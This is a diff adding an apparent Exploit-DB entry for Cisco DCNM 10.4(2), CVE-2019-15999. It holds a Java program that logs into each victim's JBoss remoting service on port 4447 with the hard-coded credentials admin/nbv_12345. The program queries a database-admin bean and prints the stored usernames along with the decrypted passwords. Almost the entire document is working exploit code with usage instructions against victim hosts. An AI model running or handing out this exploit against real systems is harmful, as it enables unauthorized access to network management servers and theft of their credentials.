@@ -1,0 +1,61 @@
+# Exploit Title: Cisco DCNM JBoss 10.4 - Credential Leakage
+# Date: 2020-01-06
+# Exploit Author: Harrison Neal
+# Vendor Homepage: https://www.cisco.com/
+# Software Link: https://software.cisco.com/download/home/281722751/type/282088134/release/10.4(2)
+# Version: 10.4(2)
+# CVE: CVE-2019-15999
+
+# You'll need a few .jars from a copy of Cisco DCNM to compile and run this code
+# To compile, file path should match ${package}/${class}.java, e.g.,
+# com/whatdidibreak/dcnm_expl/Main.java
+
+# Usage: java -jar PackagedJarFile Victim1IpOrFqdn [victim2 ...]
+
+package com.whatdidibreak.dcnm_expl;
+
+import com.cisco.dcbu.jaxws.san.ep.DbAdminSEI;
+import com.cisco.dcbu.jaxws.wo.DBRowDO;
+import com.cisco.dcbu.lib.util.jboss_4_2.JBoss_4_2Encrypter;
+
+import java.util.Properties;
+
+import javax.naming.Context;
+import javax.naming.InitialContext;
+
+public class Main {
+
+    public static void main(String[] args) throws Throwable {
+        for (String target : args) {
+            System.out.println("Target: " + target);
+
+            Properties jndiProps = new Properties();
+            jndiProps.put(Context.INITIAL_CONTEXT_FACTORY, "org.jboss.naming.remote.client.InitialContextFactory");
+            jndiProps.put(Context.PROVIDER_URL, "remote://" + target + ":4447");
+            jndiProps.put(Context.SECURITY_PRINCIPAL, "admin");
+            jndiProps.put(Context.SECURITY_CREDENTIALS, "nbv_12345");
+            jndiProps.put("jboss.naming.client.ejb.context", true);
+
+            Context ctx = new InitialContext(jndiProps);
+
+            DbAdminSEI i = (DbAdminSEI) ctx.lookup("dcm/jaxws-dbadmin/DbAdminWS!com.cisco.dcbu.jaxws.san.ep.DbAdminSEI");
+
+            for (DBRowDO row : i.getServerProperties(null).getRows()) {
+                String propName = row.getEntry()[0];
+                String propValue = row.getEntry()[1];
+
+                if (propValue.isEmpty()) {
+                    continue;
+                }
+
+                if (propName.contains("user")) {
+                    System.out.println(propName + " = " + propValue);
+                } else if (propName.contains("pass")) {
+                    System.out.println(propName + " = " + propValue + " (" + JBoss_4_2Encrypter.decrypt(propValue) + ")");
+                }
+            }
+
+            System.out.println();
+        }
+    }
+}
